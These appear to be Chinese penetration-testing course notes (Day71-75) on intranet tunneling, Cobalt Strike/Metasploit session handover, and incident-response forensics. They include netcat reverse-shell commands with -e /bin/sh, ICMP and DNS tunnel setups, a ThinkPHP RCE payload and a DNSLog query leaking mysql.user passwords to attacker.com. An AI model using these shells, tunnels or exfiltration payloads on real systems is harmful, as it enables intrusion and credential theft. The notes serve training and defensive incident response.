# XD安全渗透测试课程 Day71-75：内网渗透隧道技术、C2联动与应急响应全流程实战

## 概述

本页面整理自 XD安全渗透测试课程第 71-75 天学习笔记，系统覆盖**内网隧道技术**、**C2 框架联动**、**应急响应标准流程**、**操作系统与第三方应用入侵排查实战**、**日志分析核心技术**、**自动化工具链落地**六大板块。内容衔接 [[xd-security-pentest-basic-stage-notes]] 基础阶段 Web 攻防与 [[xd-security-pentest-course-curriculum]] 完整课程体系，并融合《渗透测试中的溯源手法》等实战方法论，形成从“漏洞利用→内网横向→事后溯源修复→威胁归因”的闭环知识图谱。

---

## 一、Day71：内网隧道技术全谱系实战

### 核心概念辨析

| 概念 | 核心目的 | 典型场景 |
|------|----------|----------|
| **代理** | 解决访问问题（跳板访问目标网络） | SOCKS5/HTTP 代理链、Proxychains 全工具代理化 |
| **隧道** | 封装/改变通信协议绕过拦截、实现数据外带 | CS/MSF 无法上线、出口流量被监控、非标准端口放行、ICMP/DNS 仅允许特定协议 |

> **隧道前置条件**：已获得一定控制权（Webshell/命令执行/会话），但受限于网络策略无法直接通信。

### 三层隧道技术矩阵

| 网络层 | 传输层 | 应用层 |
|--------|--------|--------|
| IPv6 隧道 | TCP/UDP 端口转发 | SSH 隧道 |
| **ICMP 隧道** (ptunnel/icmptunnel) | **Netcat** 多向连接 | HTTP/S 隧道 (reGeorg/Neo-reGeorg) |
| | lcx / Portmap / socat | **DNS 隧道** (dnscat2/iodine/Cobalt Strike DNS Beacon) |

### 连通性检测基础命令

| 协议 | Windows/Linux 通用检测命令 |
|------|----------------------------|
| TCP | `nc -zv <IP> <Port>` / `curl -v telnet://<IP>:<Port>` |
| HTTP | `curl -I <URL>` / `wget --spider <URL>` |
| ICMP | `ping <IP/Domain>` |
| DNS | `nslookup <Domain> [DNSServer]` / `dig @<DNSServer> <Domain>` |

### 实战案例复现

#### 网络层：ICMP 隧道
- **工具**：`ptunnel` (Kali 自带) / `icmptunnel` / `PingTunnel`
- **拓扑**：Kali (攻击机) → Target2 (WebServer, 双网卡) → Target3 (内网主机, 3389)
- **流程**：
  1. Target2 运行 `ptunnel -lp 1080 -da Target3_IP -dp 3389 -x <password>`
  2. Kali 运行 `ptunnel -p Target2_IP -lp 1080 -da Target3_IP -dp 3389 -x <password>`
  3. Kali 连接 `rdesktop 127.0.0.1:1080`，流量经 ICMP 封装穿越防火墙
- **检测视角**：目标主机 `netstat -an` 显示 3389 被 Target2 连接，实为 Kali 经 ICMP 隧道转发

#### 传输层：端口转发
- **Windows**：`lcx.exe -slave <Attacker_IP> <Attacker_Port> 127.0.0.1 3389` (反向转发)  
  `lcx.exe -listen <Listen_Port> <Forward_Port>` (正向监听)
- **Linux**：`portmap` / `socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>`
- **场景**：域环境下跳板机转发 RDP/SSH/SMB 端口至攻击机

#### 传输层：Netcat 多向连接与反弹 Shell
| 模式 | 攻击机 | 受害机 | 适用场景 |
|------|--------|--------|----------|
| **正向连接** | `nc -v <Victim_IP> <Port>` | `nc -lvp <Port> -e /bin/sh` (Linux) / `cmd.exe` (Win) | 受害机有公网 IP、防火墙允许入站 |
| **反向连接** | `nc -lvp <Port>` | `nc <Attacker_IP> <Port> -e /bin/sh` | 受害机在内网、仅允许出站 |
| **多向链式** | `nc -lvp 4444` | `nc <Jump_IP> <Jump_Port> -e /bin/sh` | 跳板机再转发至攻击机，配合 `lcx`/`socat` 实现多级跳板 |

> **Netcat 扩展功能**：服务指纹识别 `nc -nv <IP>`、端口扫描 `nc -zv <IP> 1-65535`、文件传输 `nc -lp 1111 > out.txt` (接收) / `nc -vn <IP> 1111 < in.txt -q 1` (发送)

#### 应用层：DNS 隧道配合 Cobalt Strike 上线
- **前置**：拥有域名、可控 NS 记录、TeamServer 公网 IP 开放 UDP 53
- **域名配置**：
  - A 记录：`cs.xiaodi8.com → TeamServer_IP`
  - NS 记录：`ns1.xiaodi8.com → cs.xiaodi8.com`，`ns2.xiaodi8.com → cs.xiaodi8.com`
- **CS 监听器**：Beacon DNS，Hosts 填 `ns1.xiaodi8.com,ns2.xiaodi8.com,cs.xiaodi8.com`
- **生成 Payload**：Artifact Kit / `crossc2` 生成 DNS Beacon，上线特征：心跳间隔长、流量隐藏在 DNS TXT/NULL 记录
- **检测对抗**：流量混淆参考 [[c2-redirectors-malleable-c2-profiles]] Malleable Profile 定制；主机层关注 `powershell.exe`/`rundll32.exe` 发起异常 DNS 请求，结合 Sysmon Event ID 22 (DNS Query) 分析

> **隧道技术选型决策树**：ICMP (仅允许 Ping) → DNS (仅允许 DNS 解析) → HTTP/S (Web 代理放行) → TCP/UDP 端口转发 (高速稳定) → SMB Named Pipe (域内横向) → SSH (Linux 运维通道)

### 交叉引用导航

- 系统化隧道技术对比：[[internal-network-pivoting-techniques]] (含 Venom/Frp/SSH/Cobalt Strike SMB Beacon/Metasploit 路由/Proxychains 全链路)
- ICMP/DNS/端口转发工具链：[[frp内网渗透应用]]、[[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]
- 实战靶场场景：[[vulnhub-boredhackerblog-social-network-writeup]] (Docker 逃逸+Frp 横向)、[[gkctf-2021-web-writeup]] hackme (frp 内网穿透)

---

## 二、Day72：C2 框架联动与 Web 攻击应急响应溯源实战

### 攻击溯源方法论体系（融合实战手法）

渗透测试与应急响应中的攻击溯源遵循**“由果溯因、由表及里、多源印证”**原则，核心维度如下：

| 溯源维度 | 核心手法 | 关键工具/平台 | 交叉引用 |
|----------|----------|---------------|----------|
| **IP定位与归属分析** | IDC/CDN/运营商 IP 识别、IP 反查域名、历史解析记录、威胁情报碰撞 | OpenGPS、站长之家 Whois、微步在线、奇安信威胁情报、SecurityTrails、VirusTotal | [[threat-attribution-tracing-techniques]] |
| **钓鱼邮件反查** | 附件 MD5/恶意 URL 威胁情报查杀、沙箱动态分析、邮件头溯源发件人基础设施 | 奇安信/微步/卡巴斯基/安恒沙箱、PhishTool、Email Header Analyzer | [[threat-attribution-tracing-techniques]]、[[phishing-website-creation-tutorial]] |
| **恶意样本分析** | 静态特征提取(字符串/导入表/加壳识别)、动态沙箱行为监控、流量包分析反连 C2、代码相似度比对 | IDA Pro/Ghidra、PEiD/Detect It Easy、Cuckoo/ViCheck、Wireshark/Zeek、BinDiff | [[android-shelling-unshelling-techniques]]、[[pe-import-table-internals]]、[[phantom-dll-hollowing-technique]] |
| **攻击者ID画像与社工碰撞** | 手机号/邮箱/社交账号/昵称/支付宝账户收集、社工库/威胁情报库/多平台指纹关联 | Social-Analyzer、Sherlock、社工库查询、威胁情报平台关联分析 | [[threat-attribution-tracing-techniques]]、[[cybersecurity-interview-guide-2022]] |
| **VPS/跳板机渗透溯源** | Web 应用指纹识别、漏洞挖掘获取权限、蜜罐甄别、基础设施关联分析 | FOFA/ZoomEye/Quake、Nmap/Nuclei、Metasploit、Cobalt Strike | [[internal-network-pivoting-techniques]]、[[cobalt-strike-external-c2-smb-beacon]] |
| **主机入侵痕迹排查** | Windows/Linux 易失性/非易失性数据采集、日志时间线重建、持久化机制枚举、制品解析 | LastActivityView、Event Viewer、RegRipper、MFTECmd、AmcacheParser、LinEnum、linux-exploit-suggester | [[xd-security-incident-response-notes]] (本页面 Day73-75)、[[named-pipe-smb-detection-sysmon]] |
| **网络流量回溯** | 全量流量包捕获/存储、会话重组、异常协议/隧道识别、C2 通信特征提取、横向移动流量还原 | Wireshark/Zeek/Suricata、Moloch/Arkime、NetworkMiner、PCAP 分析脚本 | [[c2-redirectors-malleable-c2-profiles]]、[[smb-named-pipe-c2-communication]] |

> **溯源实战原则**：
> 1. **证据保全优先**：镜像磁盘、导出内存、导出日志、哈希固证，符合电子数据取证规范。
> 2. **时间线为轴**：以文件修改时间、日志时间戳、MFT/USN Journal 为主轴串联离散事件。
> 3. **ATT&CK 映射**：将观测到的 TTPs 映射至 MITRE ATT&CK 矩阵，推断攻击者意图与后续动作。
> 4. **归因分级**：技术归因(工具/基础设施/代码复用) → 组织归因(行动模式/目标/受害者画像) → 实体归因(自然人/机构)，严谨区分置信度。

### Cobalt Strike 与 Metasploit 双向会话移交

#### CS → MSF (Spawn 到 MSF)
1. CS 创建监听器：`Payload: windows/foreign/reverse_http`，Host 设为 MSF 所在 IP，Port 自定义 (如 8080)
2. MSF 启动对应 Handler：
   ```msf
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_http
   set LHOST <MSF_IP>
   set LPORT 8080
   set ExitOnSession false
   exploit -j
   ```
3. CS 目标会话右键 `Spawn` → 选择上述监听器 → MSF 获得 Meterpreter 会话

#### MSF → CS (Meterpreter 注入 CS Beacon)
1. CS 创建监听器：`Payload: windows/beacon_http/reverse_http`，记录端口 (如 9090)
2. MSF 会话中执行：
   ```msf
   sessions -i <Meterpreter_ID>
   run post/windows/manage/execute_payload
   set SESSION <ID>
   set PAYLOAD windows/meterpreter/reverse_http
   set LHOST <CS_TeamServer_IP>
   set LPORT 9090
   exploit
   ```
   或使用 `generate -t raw -f raw -o beacon.bin` 结合 `execute -f beacon.bin -m` 手动注入
3. CS 界面上线新 Beacon

> **实战价值**：结合 CS 图形化横向移动 (Port Scan/Psexec/SMB Beacon) 与 MSF 丰富后渗透模块 (Kiwi/Incognito/本地提权/凭证导出)，形成“CS 指挥 + MSF 执行”混合作战体系。详见 [[internal-network-pivoting-techniques]] 会话移交章节、[[cobalt-strike-external-c2-smb-beacon]] SMB Beacon 横向。

### Web 攻击应急响应溯源实战：首页篡改案例复现

#### 场景还原
- **现象**：客户反馈网站首页被篡改，挂马/黑页/SEO 植入
- **目标**：定位入侵时间、攻击路径、Webshell 位置、攻击者行为轨迹

#### 溯源三步走策略（增强版）

| 步骤 | 核心动作 | 关键工具/命令 | 产出物 |
|------|----------|---------------|--------|
| **1. 定位篡改时间 & 入口** | 对比首页文件修改时间、Web 日志访问记录、数据库修改时间、WAF/IDS 告警日志 | `stat index.php`、IIS/Nginx/Apache 访问日志 `grep "index" access.log`、MySQL `general_log`、WAF 日志导出 | 精确到分钟的入侵时间窗口、疑似攻击入口 URL/参数 |
| **2. Webshell 多维查杀与定位** | 敏感函数扫描、YARA 规则匹配、文件熵值分析、工具指纹识别、流量侧写关联 | `find /var/www -name "*.php" -exec grep -l "eval\|assert\|system\|passthru" {} \;`、河马/深信服/D 盾/WebshellKill、[[php-webshell-obfuscation-av-evasion]] 混淆对抗、Zeek/Suricata 流量规则 | Webshell 绝对路径、密码、连接工具 (菜刀/蚁剑/Godzilla/Behinder)、关联攻击者 IP |
| **3. 进程/网络/文件执行记录 & 基础设施关联分析** | 还原攻击者交互行为、横向移动痕迹、持久化手段、溯源攻击者真实 IP/跳板/域名/邮箱/样本 | 任务管理器/Process Explorer/Process Hacker、`netstat -ano`/`ss -antlp`、`Get-FileHash`、Prefetch/Amcache/Shimcache/USN Journal、Sysmon 全事件审计、威胁情报平台反查 | 完整攻击链时间线、C2 服务器 IP/域名、横向目标、持久化机制、攻击者基础设施画像 |

#### 实战操作详解

##### 步骤 1：日志定位篡改时间与入口
- **Web 服务器日志路径**：
  - IIS：`%SystemDrive%\inetpub\logs\LogFiles\W3SVC<SiteID>\u_ex<YYMMDD>.log`
  - Apache：`/var/log/apache2/access.log` 或 `/var/log/httpd/access_log`
  - Nginx：`/var/log/nginx/access.log` (宝塔面板：网站→设置→日志→下载)
- **关键字搜索**：
  ```bash
  # 疑似 Webshell 访问 (结合 [[php-webshell-fundamentals-chopper-analysis]] 特征)
  grep -E "x\.php|shell|cmd|eval|assert|passthru|system|base64" access.log
  # 文件上传漏洞利用
  grep -E "upload|file.*\.php|\.jsp|\.asp|\.aspx" access.log
  # 篡改首页前后的 POST 请求
  awk -F'"' '$6 ~ /POST/ && $2 ~ /index/' access.log
  # ThinkPHP/Struts2 等框架 RCE 特征 (参考 [[xd-security-pentest-basic-stage-notes]])
  grep -E "think\b|struts|ognl|class\.module" access.log
  ```
- **时间窗口确认**：结合 `stat index.html` 修改时间，锁定攻击发生在 `2024-01-15 14:32:10` 前后

##### 步骤 2：Webshell 多维查杀体系
| 检测维度 | 方法 | 典型特征 | 对抗参考 |
|----------|------|----------|----------|
| **静态特征** | 敏感函数 `eval/assert/system/passthru/shell_exec/proc_open/popen/curl_exec`、Base64/十六进制/混淆编码高熵值 | `<?php @eval($_POST['x']);?>`、`assert(base64_decode(...))`、`$_GET[0]($_POST[1])` | [[php-webshell-obfuscation-av-evasion]] 算术表达式拆分、XOR 混淆 |
| **工具指纹** | 菜刀 `Content-Type: application/x-www-form-urlencoded`、蚁剑 `Accept: */*; q=0.01`、Godzilla `Key: <UUID>`、Behinder `X-Requested-With: XMLHttpRequest` | 结合 [[php-webshell-fundamentals-chopper-analysis]] 流量特征库识别 | WAF/日志审计匹配指纹 |
| **动态行为** | RASP/IAST 监控 `execve`/`CreateProcess` 子进程、异常网络连接、文件落地 | 进程树异常：`httpd`/`nginx`/`php-fpm` 启动 `bash`/`powershell`/`cmd.exe` | [[phantom-dll-hollowing-technique]] 内存注入无文件落地对抗 |
| **文件完整性** | 核心目录定时哈希对比 (`md5deep`/`Tripwire`/`AIDE`)、`inotifywait` 实时监控新增/修改文件 | 首页 `index.php` 哈希值突变、出现 `x.php`/`shell.php`/`wp-admin/images/x.jpg` | — |

> **工具推荐**：河马 Webshell 查杀 (Linux/Win)、D 盾 Web 查杀 (Win)、深信服 Webshell 检测、开源 `WebshellDetect`/`YARA-Rules`/`malware-scan`、[[pocsuite3-vulnerability-testing-framework]] 批量验证

##### 步骤 3：进程、网络连接、文件执行记录深度分析

**进程分析**
- **任务管理器/Process Explorer/Process Hacker**：查看可疑进程 (非系统签名、无描述、路径异常、用户非 SYSTEM/Network Service)
- **关键列**：PID、PPID、命令行、镜像路径、用户、启动时间、签名验证
- **案例发现**：`Apache` 进程下启动 `cmd.exe` → `powershell.exe` → `whoami`、`net user`、`ipconfig`，确认为 Webshell 交互进程

**网络连接分析**
```cmd
netstat -ano | findstr :80
netstat -ano | findstr ESTABLISHED
# 关联 PID 到进程
tasklist | findstr <PID>
```
- **发现**：PID 2844 (httpd.exe) 建立 TCP 连接至 `203.0.113.45:443` (C2 服务器)，心跳间隔 60s，User-Agent 伪造 Chrome
- **流量包分析**：导出 PCAP，Wireshark 追踪流还原 HTTP/DNS/SMB 交互，识别 [[c2-redirectors-malleable-c2-profiles]] Malleable Profile 特征、[[smb-named-pipe-c2-communication]] 命名管道通信

**文件执行记录/制品分析**
| 制品类型 | 位置 | 解析工具 | 提取信息 |
|----------|------|----------|----------|
| **Prefetch** | `C:\Windows\Prefetch\` | `PECmd.exe` / `WinPrefetchView` | 程序最后运行时间、运行次数、引用文件 |
| **Amcache** | `C:\Windows\AppCompat\Programs\Amcache.hve` | `AmcacheParser.exe` / `RegistryExplorer` | 首次/最近运行时间、文件哈希、路径、SHA1 |
| **Shimcache** | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` | `AppCompatCacheParser.exe` | 程序执行历史 (含已删除文件) |
| **USN Journal** | `$Extend\$UsnJrnl:$J` | `USNParser.exe` / `MFTECmd.exe` | 文件创建/修改/删除/重命名精确时间戳 |
| **SRUM** | `C:\Windows\System32\sru\SRUDB.dat` | `SrumECmd.exe` | 进程网络流量统计、CPU/内存使用、用户上下文 |
| **MFT** | `$MFT` | `MFTECmd.exe` / `AnalyzeMFT` | 全量文件元数据、驻留文件内容、时间戳 |

- **案例关联**：通过 USN Journal 发现 `x.php` 创建于 `2024-01-15 14:31:58`，Amcache 显示 `cmd.exe` 在 `14:32:05` 被 `httpd.exe` 启动，Prefetch 确认 `powershell.exe` 运行次数激增，完整还原攻击链。

#### 溯源报告输出模板

```markdown
## Web 攻击应急响应溯源报告
### 事件概述
- 发现时间：2024-01-15 16:00
- 影响资产：Web Server (192.168.1.100, Windows 2016, Apache 2.4 + PHP 7.4)
- 现象：首页 index.php 被篡改植入恶意跳转代码

### 攻击时间线
| 时间 | 事件 | 证据来源 |
|------|------|----------|
| 14:31:58 | 攻击者上传 Webshell x.php | USN Journal 文件创建记录 |
| 14:32:02 | 攻击者访问 x.php 执行 whoami | Apache access.log POST /x.php |
| 14:32:05 | httpd.exe 启动 cmd.exe | Amcache/Prefetch 进程执行记录 |
| 14:32:10 | 篡改 index.php 写入恶意代码 | stat index.php 修改时间 + access.log POST |
| 14:35:00 | 建立 C2 反向连接 203.0.113.45:443 | netstat/Sysmon Event ID 3 网络连接 |

### 攻击路径与溯源延伸
1. 利用 ThinkPHP 5.0.24 RCE (CVE-2019-9082) 执行任意命令 (入口确认)
2. 写入 Webshell x.php (蚁剑连接特征确认)
3. 执行系统侦察命令，尝试横向扫描内网 (进程/网络证据)
4. 篡改首页植入 SEO 恶意链接 (文件修改证据)
5. 下载 Cobalt Strike Beacon (DNS 隧道) 建立持久化 (流量/制品证据)
6. **溯源延伸**：C2 IP `203.0.113.45` 经威胁情报关联至 APT-C-XX 组织；域名 `cs.xiaodi8.com` 注册邮箱 `attacker@protonmail.com` 经社工库碰撞关联真实身份；样本 `beacon.bin` 代码相似度匹配该组织历史武器库。

### 处置建议
- 立即隔离主机、备份现场、清理 Webshell 及关联文件
- 修复 ThinkPHP 漏洞 (升级/补丁/WAF 虚拟补丁)
- 重置服务器账号密码、检查计划任务/启动项/服务持久化
- 部署 RASP/EDR、开启 Sysmon 全审计、配置日志集中采集
- 威胁情报入库、封禁关联 IOC、开展全网排查
```

### 交叉引用导航

- Webshell 原理与流量特征：[[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]]
- C2 通信隐匿与检测：[[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]]
- Windows 制品解析与溯源：[[internal-network-pivoting-techniques]] 应急响应章节、[[cybersecurity-interview-guide-2022]] 应急响应面试题库
- 实战靶场复现：[[gkctf-2021-web-writeup]] babycat/easynode (Webshell Getshell)、[[vulnhub-boredhackerblog-social-network-writeup]] (代码注入→Webshell→横向)
- 溯源方法论总览：[[threat-attribution-tracing-techniques]] (威胁溯源/攻击归因/应急响应/数字取证/IP定位/钓鱼邮件分析/恶意样本分析/主机入侵排查/流量回溯)

---

## 三、Day73：应急响应标准流程（五阶段模型）

### 五阶段模型详解

| 阶段 | 核心目标 | 关键动作 | 产出物 |
|------|----------|----------|--------|
| **保护** | 固化现场、防止扩散 | 物理/逻辑隔离（断网/快照/镜像）、易失性数据优先采集（内存/网络连接/进程/登录会话/计划任务/启动项） | 取证镜像、易失性数据包、现场照片/记录 |
| **分析** | 还原攻击链 | 指纹库比对、日志时间线重建、后门/Rootkit 深度排查、漏洞利用痕迹研判、ATT&CK 技术映射、威胁情报关联归因 | 攻击链复现报告、IOC 清单 (IP/域名/Hash/文件路径/注册表/用户名)、归因分析研判 |
| **复现** | 验证攻击路径 | 搭建同版本环境、按攻击者 TTPs 复现、定位入口与横向移动路径、验证修复有效性 | 复现视频/步骤文档、漏洞 PoC/EXP |
| **修复** | 根因消除 | 补丁修补、弱口令整改、后门清理、账号体系梳理、权限最小化、WAF/RASP 虚拟补丁、配置基线加固 | 修复记录、加固清单、验收报告 |
| **建议** | 体系加固 | 安全基线配置、日志审计完善、EDR/态势感知部署、应急预案演练、红蓝对抗常态化、安全运营体系建设、威胁狩猎常态化 | 策略文档、预案更新、培训计划、工具采购建议 |

> **实战提示**：受害方提供“明确信息”（时间点、被改文件、Webshell 路径、工具指纹）可大幅缩小排查面；若无明确信息，需按 **Web漏洞→中间件→第三方应用→操作系统→口令/后门** 全维度排查。

### 必备知识储备

- 熟练掌握常见 Web 攻击技术（SQLi、XSS、文件上传、反序列化、SSRF、RCE 等），参考 [[xd-security-pentest-basic-stage-notes]] 与 [[attack-defense-world-beginner-web-writeup]]、[[attack-defense-world-master-advanced-writeup]]、[[buuctf-web-writeup-collection]]、[[pikachu-target-writeup-part1-setup-brute-force]] 至 [[pikachu-target-writeup-part5]] 实战库
- 精通 Windows Event Log / Linux `/var/log` / 数据库审计日志的**启用策略、存储路径、字段语义、常见攻击特征**
- 掌握日志聚合与分析平台：ELK、Splunk、360星图（仅支持 Apache/IIS/Nginx）、FileSeek、GScan 等

---

## 四、Day73-75：日志分析实战与入侵排查深度实战

### Windows + IIS + SQL Server 日志溯源

1. **IIS 日志定位**：`%SystemDrive%\inetpub\logs\LogFiles\W3SVC<SiteID>\`，按站点 ID 区分
2. **关键字段**：`date time s-ip cs-method cs-uri-stem cs-uri-query sc-status sc-substatus sc-win32-status time-taken`
3. **攻击指纹识别**：
   - SQL 注入：`%27`、`union select`、`waitfor delay`、`xp_cmdshell`、`load_file`、`into outfile`
   - 命令执行：`cmd.exe`、`powershell`、`whoami`、`net user`、`certutil`、`bitsadmin`
   - 文件上传：`.asp`、`.aspx`、`.php`、`.jsp` 后缀配合 `Content-Type: image/jpeg` 绕过，参考 [[php-webshell-fundamentals-chopper-analysis]]、[[burpsuite-basics-tutorial]] Content-Type 伪造技巧
4. **工具辅助**：360星图（需配置 `conf`）、Log Parser Studio、LogonTracer（详见 6.1）

### Linux + 宝塔 + Nginx + ThinkPHP5 日志排查

1. **宝塔面板日志导出**：网站 → 设置 → 日志 → 下载至本地
2. **Nginx 访问日志关键列**：`$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"`
3. **ThinkPHP5 RCE 指纹**：`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`，结合 [[gkctf-2021-web-writeup]] babycat 题目 XMLDecoder/Gson 绕过链
4. **宝塔自带后门查杀**：网站 → 安全 → 木马查杀，配合人工复核

### 数据库审计日志深度分析

#### MySQL 通用日志

```sql
SHOW VARIABLES LIKE "%general%";
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
```

- **暴力破解特征**：短时间内大量 `Connect Access denied for user 'root'@'IP'`，配合 [[ctfshow-web-info-gathering-brute-force]] 爆破字典特征
- **SQL 注入特征**：`union select`、`sleep()`、`benchmark()`、`load_file()`、`into outfile`、报错注入 `extractvalue()`/`updatexml()`/`floor(rand(0)*2)`，参考 [[mysql-duplicate-entry-error-based-sqli]]、[[mysql-dnslog-injection-loadfile-unc]]、[[ctfshow-web-sql-injection-bypass-basics]]
- **DNSLog 外带**：`load_file(CONCAT('\\\\',(SELECT password FROM mysql.user LIMIT 1),'.attacker.com\\abc'))`，需 `secure_file_priv=''` 且 Windows 环境

#### MSSQL 跟踪文件

- 通过 SQL Server Profiler / 系统存储过程 `sp_trace_create` 配置跟踪
- 关注 `RPC:Completed`、`SQL:BatchCompleted` 事件中的 `TextData` 字段
- 典型攻击：`xp_cmdshell` 开启、`sp_oacreate`/`sp_oamethod` COM 对象执行命令、链接服务器攻击

#### Oracle 审计

```sql
AUDIT SELECT TABLE, INSERT TABLE, UPDATE TABLE, DELETE TABLE BY ACCESS;
AUDIT CREATE SESSION BY ACCESS;
```
- 审计表 `DBA_AUDIT_TRAIL` / `USER_AUDIT_TRAIL` 记录 `ACTION_NAME`、`OBJ_NAME`、`SQL_TEXT`、`CLIENT_ID`、`OS_USERNAME`

---

### 暴力破解溯源实战

#### Windows RDP (3389)

- **审核策略**：本地安全策略 → 审核登录事件（成功/失败）
- **关键事件 ID**：
  - `4624` 登录成功（Type 10=RDP，Type 3=网络）
  - `4625` 登录失败（SubStatus `0xC000006A`=密码错误，`0xC0000064`=用户不存在）
  - `4776` NTLM 认证尝试（域控）
- **工具**：`LogParser`、`EventLog Explorer`、[[named-pipe-smb-detection-sysmon]] Sysmon Event ID 10/11/12/13 进程/网络/注册表/文件创建关联

#### Linux SSH (22)

```bash
# 统计失败次数
grep -o "Failed password" /var/log/secure | uniq -c

# 时间范围
grep "Failed password" /var/log/secure | head -1
grep "Failed password" /var/log/secure | tail -1

# 攻击 IP TOP
grep "Failed password" /var/log/secure | grep -Eo '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' | uniq -c | sort -nr

# 爆破用户名字典
grep "Failed password" /var/log/secure | perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}' | uniq -c | sort -nr

# 成功登录
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
```

> 关联 [[lm-ntlm-hash-generation-analysis]] 理解 NTLM 认证流程，[[mimikatz-source-code-architecture-golden-ticket-audit]] 掌握凭证导出与黄金票据利用链。

---

### 后门与木马多维排查

#### Webshell 多维检测体系

| 维度 | 检测手法 | 关联页面 |
|------|----------|----------|
| **静态特征** | YARA 规则、敏感函数 `eval/assert/system/passthru/shell_exec/proc_open/popen/curl_exec`、Base64/十六进制/混淆编码熵值分析 | [[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]] |
| **动态行为** | RASP/IAST 监控 `execve`/`CreateProcess` 子进程、异常网络连接、文件落地 | [[phantom-dll-hollowing-technique]]、[[pe-manual-mapping-loader-implementation]] |
| **流量侧写** | HTTP POST 无 Referer、User-Agent 异常、Cookie 含密码参数、心跳包固定间隔 | [[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]] |
| **文件完整性** | 核心目录 `/var/www/html`、`C:\inetpub\wwwroot` 定时哈希对比、inotifywait 实时监控 | — |

#### PC 木马 / CrossC2 / Geacon 实战溯源

- **CrossC2**：Cobalt Strike 外部 C2 规范的 Go 实现，生成 Linux/macOS Beacon，通信走 HTTPS/HTTP/SMB Named Pipe
  - 部署：`./genCrossC2.Linux <CS_IP> <Port> <Profile> <Key> Linux x64 C2`
  - 排查：`netstat -ntulp`、`ss -antlp` 发现异常监听/外联，结合 [[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]、[[frp内网渗透应用]]、[[internal-network-pivoting-techniques]] 理解隧道与代理链路
- **Geacon**：Go 编写的 Cobalt Strike 兼容 Beacon，支持 HTTP/DNS/SMB 通信
- **检测要点**：
  - 进程树异常：`nginx`/`php-fpm`/`java` 启动 `bash`/`sh`/`python`/`curl`/`wget`
  - 内存特征：`VirtualAlloc`+`RWX`、`CreateThread`、`NtCreateThreadEx`、反射加载 PE
  - 网络特征：定时心跳、证书自签名、JA3 指纹固定、Malleable Profile 特征（参考 [[c2-redirectors-malleable-c2-profiles]]）
  - 主机层：Sysmon Event ID 1/3/7/8/10/11/12/13/15/17/18/19/20/21/22 全维度覆盖

---

### 勒索病毒应急处置（WannaCry 为例）

1. **现象确认**：文件后缀 `.wncry`、桌面 `@Please_Read_Me@.txt` 勒索信息、端口 445 异常外联、进程 `tasksche.exe`/`mssecsvc.exe`、`C:\Windows\qeriuwjhrf` 等随机名
2. **遏制**：立即断网、隔离受感染网段、关闭 445/139/3389 端口
3. **溯源**：
   - 永恒之蓝 (MS17-010) 利用链：`SMBv1` 协议漏洞 → `DoublePulsar` 后门植入 → `WannaCry` 投递
   - 日志：System 事件 ID 7045 服务安装、Security 4624/4625 匿名登录、防火墙日志 445 端口扫描
4. **恢复**：
   - 360/火绒/卡巴斯基专用解密工具：<https://lesuobingdu.360.cn/>、<https://www.nomoreransom.org/zh/index.html>
   - 影子副本恢复：`vssadmin list shadows`、`wbadmin`、第三方工具 ShadowExplorer
   - 备份恢复：离线冷备优先，验证备份未被加密
5. **加固**：
   - 补丁：KB4012598 (MS17-010)
   - 关闭 SMBv1：`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`
   - 组策略限制 `taskschd`/`wmic`/`powershell` 执行、AppLocker 白名单、EDR 开启防篡改

---

## 五、Day75：第三方应用漏洞自查与自动化应急工具箱

### Windows 日志可视化溯源：LogonTracer

**架构**：Neo4j 图数据库 + Python 解析 EVTX + Web GUI 交互展示

| 步骤 | 命令/操作 |
|------|-----------|
| 1. 部署 Neo4j | `git clone https://github.com/neo4j/neo4j` → 修改 `dbms.connector.bolt.listen_address=0.0.0.0:7687` → `./bin/neo4j console &` |
| 2. 安装依赖 | `sudo yum install java-11-openjdk -y` → `pip3 install -r requirements.txt` |
| 3. 克隆工程 | `git clone https://github.com/JPCERTCC/LogonTracer.git` |
| 4. 导入日志 | `python3 logontracer.py -e <evtx_file> -z <时区> -u neo4j -p <password> -s <neo4j_ip>` |
| 5. 实时分析 | `python3 logontracer.py -r -o <PORT> -u neo4j -p <password> -s <neo4j_ip>` |
| 6. Web 访问 | `http://<IP>:<PORT>` 查看账号-IP-时间-登录类型图谱，快速定位横向移动、黄金票据、Pass-the-Hash |

> 结合 [[mimikatz-source-code-architecture-golden-ticket-audit]] 理解 Kerberos 委派攻击在图谱中的表现。

### 系统漏洞自查工具链

| 平台 | 工具 | 核心能力 | 典型用法 |
|------|------|----------|----------|
| **Windows** | **WindowsVulnScan** | 基于 KB 补丁号离线匹配 CVE，支持 `cve-check.py -C -f KB.json` | `systeminfo > info.txt` → 导出补丁列表 `wmic qfe list full /format:csv > KB.csv` → 转 JSON → 扫描 |
| **Linux** | **linux-exploit-suggester** | 内核版本/发行版匹配 Exploit-DB/CVE，输出可用提权漏洞及利用代码链接 | `./linux-exploit-suggester.sh --kernel $(uname -r) --distro $(lsb_release -is)` |
| **Linux** | **LinEnum** | 全自动枚举：内核/发行版/SUID/SGID/cron/sudoers/网络/进程/服务/历史命令/密码文件/容器特征 | `./LinEnum.sh -t -k keyword -r report -e /tmp/` |

